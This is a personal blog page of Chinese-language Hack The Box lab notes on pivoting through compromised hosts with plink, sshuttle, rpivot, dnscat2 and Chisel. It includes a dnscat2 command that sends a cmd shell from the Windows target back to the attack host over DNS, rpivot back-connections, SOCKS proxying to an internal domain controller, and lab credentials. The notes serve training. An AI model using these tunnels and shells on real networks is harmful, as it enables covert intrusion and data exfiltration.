@@ -1,0 +1,243 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Pivoting Around Obstacles &amp; Branching Out Our Tunnels</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="SSH for Windows: plink.exePlinkPuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 PuTTY。
+如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。
+Getting To Know Plink
+Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Pivoting Around Obstacles &amp; Branching Out Our Tunnels</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-for-Windows-plink-exe"><span class="toc-text">SSH for Windows: plink.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-To-Know-Plink"><span class="toc-text">Getting To Know Plink</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-Pivoting-with-Sshuttle"><span class="toc-text">SSH Pivoting with Sshuttle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Installing-sshuttle"><span class="toc-text">Installing sshuttle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Traffic-Routing-through-iptables-Routes"><span class="toc-text">Traffic Routing through iptables Routes</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Server-Pivoting-with-Rpivot"><span class="toc-text">Web Server Pivoting with Rpivot</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cloning-rpivot"><span class="toc-text">Cloning rpivot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transfering-rpivot-to-the-Target"><span class="toc-text">Transfering rpivot to the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Running-client-py-from-Pivot-Target"><span class="toc-text">Running client.py from Pivot Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confirming-Connection-is-Established"><span class="toc-text">Confirming Connection is Established</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Browsing-to-the-Target-Webserver-using-Proxychains"><span class="toc-text">Browsing to the Target Webserver using Proxychains</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><span class="toc-text">Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Branching-Out-Our-Tunnels"><span class="toc-text">Branching Out Our Tunnels</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS-Tunneling-with-Dnscat2"><span class="toc-text">DNS Tunneling with Dnscat2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-Up-amp-Using-dnscat2"><span class="toc-text">Setting Up &amp; Using dnscat2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cloning-dnscat2-and-Setting-Up-the-Server"><span class="toc-text">Cloning dnscat2 and Setting Up the Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-the-dnscat2-server"><span class="toc-text">Starting the dnscat2 server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cloning-dnscat2-powershell-to-the-Attack-Host"><span class="toc-text">Cloning dnscat2-powershell to the Attack Host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Importing-dnscat2-ps1"><span class="toc-text">Importing dnscat2.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confirming-Session-Establishment"><span class="toc-text">Confirming Session Establishment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Interacting-with-the-Established-Session"><span class="toc-text">Interacting with the Established Session</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SOCKS5-Tunneling-with-Chisel"><span class="toc-text">SOCKS5 Tunneling with Chisel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-Up-amp-Using-Chisel"><span class="toc-text">Setting Up &amp; Using Chisel</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Building-the-Chisel-Binary"><span class="toc-text">Building the Chisel Binary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Running-the-Chisel-Server-on-the-Pivot-Host"><span class="toc-text">Running the Chisel Server on the Pivot Host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Connecting-to-the-Chisel-Server"><span class="toc-text">Connecting to the Chisel Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chisel-Reverse-Pivot"><span class="toc-text">Chisel Reverse Pivot</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-the-Chisel-Server-on-our-Attack-Host"><span class="toc-text">Starting the Chisel Server on our Attack Host</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ICMP-Tunneling-with-SOCKS"><span class="toc-text">ICMP Tunneling with SOCKS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setting-Up-amp-Using-ptunnel-ng"><span class="toc-text">Setting Up &amp; Using ptunnel-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Building-Ptunnel-ng-with-Autogen-sh"><span class="toc-text">Building Ptunnel-ng with Autogen.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host"><span class="toc-text">Starting the ptunnel-ng Server on the Target Host</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enabling-Dynamic-Port-Forwarding-over-SSH"><span class="toc-text">Enabling Dynamic Port Forwarding over SSH</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Traffic-Analysis-Considerations"><span class="toc-text">Network Traffic Analysis Considerations</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><span class="toc-text">RDP and SOCKS Tunneling with SocksOverRDP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Loading-SocksOverRDP-dll-using-regsvr32-exe"><span class="toc-text">Loading SocksOverRDP.dll using regsvr32.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Configuring-Proxifier"><span class="toc-text">Configuring Proxifier</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP-Performance-Considerations"><span class="toc-text">RDP Performance Considerations</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Pivoting Around Obstacles &amp; Branching Out Our Tunnels</h1><time class="has-text-grey" datetime="2023-09-03T08:08:15.000Z">2023-09-03</time><article class="mt-2 post-content"><h1 id="SSH-for-Windows-plink-exe"><a href="#SSH-for-Windows-plink-exe" class="headerlink" title="SSH for Windows: plink.exe"></a>SSH for Windows: plink.exe</h1><p><a target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Plink</a>PuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 <a target="_blank" rel="noopener" href="https://www.putty.org/">PuTTY</a>。</p>
+<p>如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。</p>
+<h2 id="Getting-To-Know-Plink"><a href="#Getting-To-Know-Plink" class="headerlink" title="Getting To Know Plink"></a>Getting To Know Plink</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031617228.png" alt="img"></p>
+<p>Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH会话，然后plink开始在端口9050上侦听。</p>
+<pre><code class="cmd-session">plink -D 9050 ubuntu@10.129.15.50
+</code></pre>
+<p>另一个名为 <a target="_blank" rel="noopener" href="https://www.proxifier.com/">Proxifier</a>的基于Windows的工具可以用于通过我们创建的SSH会话启动SOCKS隧道。Proxifier是一个Windows工具，它为桌面客户端应用程序创建隧道网络，允许它通过SOCKS或HTTPS代理进行操作，并允许代理链接。可以创建一个配置文件，在其中我们可以为Plink在端口9050上启动的SOCKS服务器提供配置。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031619809.png" alt="img"></p>
+<p>在为127.0.0.1和端口9050配置SOCKS服务器后，我们可以直接启动mstsc.exe来启动与允许RDP连接的Windows目标的RDP会话。</p>
+<h1 id="SSH-Pivoting-with-Sshuttle"><a href="#SSH-Pivoting-with-Sshuttle" class="headerlink" title="SSH Pivoting with Sshuttle"></a>SSH Pivoting with Sshuttle</h1><p><a target="_blank" rel="noopener" href="https://github.com/sshuttle/sshuttle">Sshuttle</a>是另一个用Python编写的工具，它消除了配置proxychain的需要。但是，此工具仅适用于通过SSH进行数据透视，而不提供通过TOR或HTTPS代理服务器进行数据透视的其他选项。Sshuttle对于自动执行iptables和为远程主机添加数据透视规则非常有用。我们可以将Ubuntu服务器配置为一个支点，并使用本节稍后的示例使用sshuttle路由Nmap的所有网络流量。 sshuttle的一个有趣用法是，我们不需要使用proxychans来连接到远程主机。让我们通过Ubuntu pivot主机安装sshuttle，并将其配置为通过RDP连接到Windows主机。</p>
+<h4 id="Installing-sshuttle"><a href="#Installing-sshuttle" class="headerlink" title="Installing sshuttle"></a>Installing sshuttle</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get install sshuttle
+</code></pre>
+<p>要使用sshuttle，我们指定选项-r以使用用户名和密码连接到远程机器。然后，我们需要包括我们想要通过枢轴主机路由的网络或IP，在我们的情况下，是网络172.16.5.0&#x2F;23。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+</code></pre>
+<p>使用此命令，sshuttle在我们的iptables中创建一个条目，通过pivot主机将所有流量重定向到172.16.5.0&#x2F;23网络。</p>
+<h4 id="Traffic-Routing-through-iptables-Routes"><a href="#Traffic-Routing-through-iptables-Routes" class="headerlink" title="Traffic Routing through iptables Routes"></a>Traffic Routing through iptables Routes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
+</code></pre>
+<p>我们现在可以直接使用任何工具，而无需使用proxychains。</p>
+<blockquote>
+<p>xfreerdp 默认情况下可能不信任自签名证书<code>/cert-ignore</code> 选项会忽略证书验证错误。</p>
+</blockquote>
+<h1 id="Web-Server-Pivoting-with-Rpivot"><a href="#Web-Server-Pivoting-with-Rpivot" class="headerlink" title="Web Server Pivoting with Rpivot"></a>Web Server Pivoting with Rpivot</h1><p><a target="_blank" rel="noopener" href="https://github.com/klsecservices/rpivot">Rpivot</a></p>
+<p>Rpivot是一个用Python编写的用于SOCKS隧道的反向SOCKS代理工具。Rpivot将公司网络内的计算机绑定到外部服务器，并在服务器端公开客户端的本地端口。我们将采用下面的场景，在我们的内部网络上有一个web服务器（172.16.5.135），我们想使用rpivot代理访问它。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031654234.png" alt="img"></p>
+<p>我们可以使用以下命令启动rpivot SOCKS代理服务器，以允许客户端在端口9999上连接，并在端口9050上侦听代理枢轴连接。</p>
+<h4 id="Cloning-rpivot"><a href="#Cloning-rpivot" class="headerlink" title="Cloning rpivot"></a>Cloning rpivot</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
+</code></pre>
+<p>我们可以启动rpivot SOCKS代理服务器，使用server.py连接到受损的Ubuntu服务器上的客户端。</p>
+<pre><code class="shell-session">Running server.py from the Attack Host
+Tanin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+</code></pre>
+<p>在运行client.py之前，我们需要将rpivot传输到目标。我们可以使用此SCP命令执行此操作：</p>
+<h4 id="Transfering-rpivot-to-the-Target"><a href="#Transfering-rpivot-to-the-Target" class="headerlink" title="Transfering rpivot to the Target"></a>Transfering rpivot to the Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/
+</code></pre>
+<h4 id="Running-client-py-from-Pivot-Target"><a href="#Running-client-py-from-Pivot-Target" class="headerlink" title="Running client.py from Pivot Target"></a>Running client.py from Pivot Target</h4><pre><code class="shell-session">ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+Backconnecting to server 10.10.14.18 port 9999
+</code></pre>
+<h4 id="Confirming-Connection-is-Established"><a href="#Confirming-Connection-is-Established" class="headerlink" title="Confirming Connection is Established"></a>Confirming Connection is Established</h4><pre><code class="shell-session">New connection from host 10.129.202.64, source port 35226
+</code></pre>
+<p>我们将在我们的攻击主机127.0.0.1:9050上配置proxychans以在本地服务器上进行转移，该攻击主机最初是由Python服务器启动的。 最后，我们应该能够使用proxychains和Firefox访问服务器端的Web服务器，该服务器托管在172.16.5.0&#x2F;23的内部网络上，172.16.5.135:80。</p>
+<h4 id="Browsing-to-the-Target-Webserver-using-Proxychains"><a href="#Browsing-to-the-Target-Webserver-using-Proxychains" class="headerlink" title="Browsing to the Target Webserver using Proxychains"></a>Browsing to the Target Webserver using Proxychains</h4><pre><code class="shell-session">proxychains firefox-esr 172.16.5.135:80
+</code></pre>
+<p>与上面的pivot代理类似，在某些情况下，我们可能无法直接转向云上的外部服务器（攻击主机）。某些组织使用域控制器配置了 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a>。在这种情况下，我们可以为rpivot提供一个额外的NTLM身份验证选项，通过提供用户名和密码来通过NTLM代理进行身份验证。在这些情况下，我们可以通过以下方式使用rpivot的client.py：</p>
+<h4 id="Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><a href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth" class="headerlink" title="Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth"></a>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</h4><pre><code class="shell-session">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;
+</code></pre>
+<h1 id="Branching-Out-Our-Tunnels"><a href="#Branching-Out-Our-Tunnels" class="headerlink" title="Branching Out Our Tunnels"></a>Branching Out Our Tunnels</h1><h1 id="DNS-Tunneling-with-Dnscat2"><a href="#DNS-Tunneling-with-Dnscat2" class="headerlink" title="DNS Tunneling with Dnscat2"></a>DNS Tunneling with Dnscat2</h1><p><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">Dnscat2</a></p>
+<p>Dnscat2是一种隧道工具，使用DNS协议在两个主机之间发送数据。它使用加密的命令和控制（C&amp;C或C2）通道，并在DNS协议内的TXT记录内发送数据。通常，公司网络中的每个active directory域环境都有自己的DNS服务器，该服务器将主机名解析为IP地址，并将流量路由到参与总体DNS系统的外部DNS服务器。但是，对于dnscat2，地址解析是从外部服务器请求的。当本地DNS服务器试图解析地址时，数据会被过滤并通过网络发送，而不是合法的DNS请求。Dnscat2可以是一种极为隐蔽的方法来过滤数据，同时避免防火墙检测，因为防火墙检测会剥离HTTPS连接并探查流量。对于我们的测试示例，我们可以在攻击主机上使用dnscat2服务器，并在另一台Windows主机上执行dnscat2客户端。</p>
+<h2 id="Setting-Up-amp-Using-dnscat2"><a href="#Setting-Up-amp-Using-dnscat2" class="headerlink" title="Setting Up &amp; Using dnscat2"></a>Setting Up &amp; Using dnscat2</h2><p>如果dnscat2尚未在我们的攻击主机上设置，我们可以使用以下命令进行设置：</p>
+<h4 id="Cloning-dnscat2-and-Setting-Up-the-Server"><a href="#Cloning-dnscat2-and-Setting-Up-the-Server" class="headerlink" title="Cloning dnscat2 and Setting Up the Server"></a>Cloning dnscat2 and Setting Up the Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
+</code></pre>
+<h4 id="Starting-the-dnscat2-server"><a href="#Starting-the-dnscat2-server" class="headerlink" title="Starting the dnscat2 server"></a>Starting the dnscat2 server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+</code></pre>
+<p>运行服务器后，它将向我们提供密钥，我们必须将密钥提供给Windows主机上的dnscat2客户端，以便它可以对发送到外部dnscat2服务器的数据进行身份验证和加密。我们可以将客户端与dnscat2项目一起使用，也可以使用 <a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>，这是一个基于dnscat2兼容powershell的客户端，我们可以从Windows目标运行该客户端，以与我们的dnscat2服务器建立隧道。我们可以将包含客户端文件的项目克隆到我们的攻击主机，然后将其传输到目标。</p>
+<h4 id="Cloning-dnscat2-powershell-to-the-Attack-Host"><a href="#Cloning-dnscat2-powershell-to-the-Attack-Host" class="headerlink" title="Cloning dnscat2-powershell to the Attack Host"></a>Cloning dnscat2-powershell to the Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+</code></pre>
+<p>一旦dnscat2.ps1文件在目标上，我们就可以导入它并运行相关的cmdlet。</p>
+<h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1
+</code></pre>
+<p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p>
+<pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+</code></pre>
+<p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p>
+<h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+dnscat2&gt;
+</code></pre>
+<p>我们可以通过输入？列出dnscat2的选项？在提示下。</p>
+<pre><code class="shell-session">dnscat2&gt; ?
+
+Here is a list of commands (use -h on any of them for additional help):
+* echo
+* help
+* kill
+* quit
+* set
+* start
+* stop
+* tunnels
+* unset
+* window
+* windows
+</code></pre>
+<p>我们可以使用dnscat2与会话进行交互，并在参与的目标环境中进一步移动。在本模块中，我们不会涵盖dnscat2的所有可能性，但我们强烈鼓励您使用它进行练习，甚至可能找到创造性的方法在参与中使用它。让我们与已建立的会话进行交互，然后进入shell。</p>
+<h4 id="Interacting-with-the-Established-Session"><a href="#Interacting-with-the-Established-Session" class="headerlink" title="Interacting with the Established Session"></a>Interacting with the Established Session</h4><pre><code class="shell-session">dnscat2&gt; window -i 1
+New window created: 1
+history_size (session) =&gt; 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don&#39;t
+see a prompt, try typing &#39;pwd&#39; or something!
+
+To go back, type ctrl-z.
+
+Microsoft Windows [Version 10.0.18363.1801]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;
+exec (OFFICEMANAGER) 1&gt;
+</code></pre>
+<h1 id="SOCKS5-Tunneling-with-Chisel"><a href="#SOCKS5-Tunneling-with-Chisel" class="headerlink" title="SOCKS5 Tunneling with Chisel"></a>SOCKS5 Tunneling with Chisel</h1><p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel</a> </p>
+<p>Chisel是一个用Go编写的基于TCP&#x2F;UDP的隧道工具，它使用HTTP传输使用SSH保护的数据。Chisel可以在防火墙受限的环境中创建客户端-服务器隧道连接。让我们考虑一种情况，即我们必须通过隧道将流量传输到172.16.5.0&#x2F;23网络（内部网络）上的Web服务器。我们有地址为172.16.5.19的域控制器。由于我们的攻击主机和域控制器属于不同的网段，因此攻击主机无法直接访问它。然而，由于我们已经破坏了Ubuntu服务器，我们可以在其上启动一个Chisel服务器，该服务器将监听特定端口，并通过已建立的隧道将我们的流量转发到内部网络。</p>
+<h2 id="Setting-Up-amp-Using-Chisel"><a href="#Setting-Up-amp-Using-Chisel" class="headerlink" title="Setting Up &amp; Using Chisel"></a>Setting Up &amp; Using Chisel</h2><p>在我们使用Chisel之前，我们需要在我们的攻击主机上安装它。如果我们的攻击主机上没有Chisel，我们可以使用下面的命令克隆项目repo：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
+</code></pre>
+<p>我们需要在系统上安装编程语言Go来构建Chisel二进制文件。在系统上安装Go后，我们可以进入该目录，并使用Go-build构建Chisel二进制文件。</p>
+<h4 id="Building-the-Chisel-Binary"><a href="#Building-the-Chisel-Binary" class="headerlink" title="Building the Chisel Binary"></a>Building the Chisel Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cd chisel
+go build
+</code></pre>
+<p>注意我们传输到客户网络上目标上的文件的大小可能会有所帮助，这不仅是出于性能原因，还考虑到检测。补充这一特定概念的两个有益资源是Oxdf的博客文章“<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>”和IppSec对盒子Reddish的演练。IppSec在视频的24:29开始解释Chisel，构建二进制并缩小二进制的大小。 一旦构建了二进制文件，我们就可以使用SCP将其传输到目标枢轴主机。</p>
+<pre><code class="shell-session">anin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
+ 
+ubuntu@10.129.202.64&#39;s password: 
+chisel                                        100%   11MB   1.2MB/s   00:09    
+</code></pre>
+<p>Then we can start the Chisel server&#x2F;listener.</p>
+<h4 id="Running-the-Chisel-Server-on-the-Pivot-Host"><a href="#Running-the-Chisel-Server-on-the-Pivot-Host" class="headerlink" title="Running the Chisel Server on the Pivot Host"></a>Running the Chisel Server on the Pivot Host</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+
+2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
+</code></pre>
+<p>Chisel侦听器将使用SOCKS5（–SOCKS5）侦听端口1234上的传入连接，并将其转发到可从枢轴主机访问的所有网络。在我们的案例中，枢轴主机在172.16.5.0&#x2F;23网络上有一个接口，这将允许我们访问该网络上的主机。 我们可以在攻击主机上启动客户端并连接到Chisel服务器。</p>
+<h4 id="Connecting-to-the-Chisel-Server"><a href="#Connecting-to-the-Chisel-Server" class="headerlink" title="Connecting to the Chisel Server"></a>Connecting to the Chisel Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+
+2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening
+2022/05/05 14:21:18 client: tun: Bound proxies
+2022/05/05 14:21:19 client: Handshaking...
+2022/05/05 14:21:19 client: Sending config
+2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+2022/05/05 14:21:19 client: tun: SSH connected
+</code></pre>
+<p>正如您在上面的输出中看到的，Chisel客户端已经通过HTTP在Chisel服务器和客户端之间创建了一个TCP&#x2F;UDP隧道，该隧道使用SSH进行安全保护，并且已经开始在1080端口上侦听。现在，我们可以修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans.cconf文件，并在末尾添加1080端口，这样我们就可以使用proxychans使用创建的1080端口和SSH隧道之间的隧道进行透视。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf 
+
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &quot;tor&quot;
+# socks4 	127.0.0.1 9050
+socks5 127.0.0.1 1080
+</code></pre>
+<p>现在，如果我们使用RDP的proxychains，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+</code></pre>
+<h2 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h2><p>在前面的例子中，我们使用受损的机器（Ubuntu）作为Chisel服务器，在端口1234上列出。尽管如此，在某些情况下，防火墙规则可能会限制与受损目标的入站连接。在这种情况下，我们可以将Chisel与反向选项一起使用。 当Chisel服务器启用了–reverse时，remotes可以加上前缀R来表示reverse。服务器将侦听并接受连接，并且它们将通过指定远程的客户端进行代理。指定R:socks的反向远程将侦听服务器的默认socks端口（1080），并终止客户端内部SOCKS5代理的连接。 我们将使用选项–reverse在攻击主机中启动服务器。</p>
+<h4 id="Starting-the-Chisel-Server-on-our-Attack-Host"><a href="#Starting-the-Chisel-Server-on-our-Attack-Host" class="headerlink" title="Starting the Chisel Server on our Attack Host"></a>Starting the Chisel Server on our Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+</code></pre>
+<p>我们可以使用任何编辑器来编辑proxyains.conf文件，然后使用tail确认我们的配置更改。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf 
+
+[ProxyList]
+# add proxy here ...
+# socks4    127.0.0.1 9050
+socks5 127.0.0.1 1080 
+</code></pre>
+<p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+</code></pre>
